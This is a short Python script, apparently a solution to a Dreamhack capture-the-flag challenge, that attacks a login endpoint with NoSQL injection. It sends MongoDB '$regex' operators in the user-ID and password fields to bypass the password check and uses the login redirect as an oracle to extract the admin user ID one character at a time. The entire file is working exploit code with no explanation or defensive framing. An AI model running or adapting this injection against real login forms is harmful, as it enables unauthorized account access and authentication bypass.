import requests
import string

URL = "http://host8.dreamhack.games:17687/login"
CHARSET = string.ascii_letters + string.digits + "_{}"
TIMEOUT = 3

def test_uid(prefix):
    """Trả về True nếu có user admin bắt đầu bằng prefix"""
    data = {
        "uid": {"$regex": f"^{prefix}"},
        "admin": 1,
        "upw": {"$regex": ".*"}  # bypass password
    }
    try:
        r = requests.post(URL, json=data, allow_redirects=False, timeout=TIMEOUT)
        return r.status_code == 302 and r.headers.get("Location") == "/user"
    except requests.RequestException:
        return False

def brute_uid():
    found = ""
    while True:
        found_char = None
        for ch in CHARSET:
            attempt = found + ch
            if test_uid(attempt):
                found_char = ch
                found += ch
                print(f"[+] UID so far: {found}")
                break
        if not found_char:
            print(f"[!] UID complete: {found}")
            break
    return found

if __name__ == "__main__":
    uid = brute_uid()
    print(f"[✅] Admin UID: {uid}")
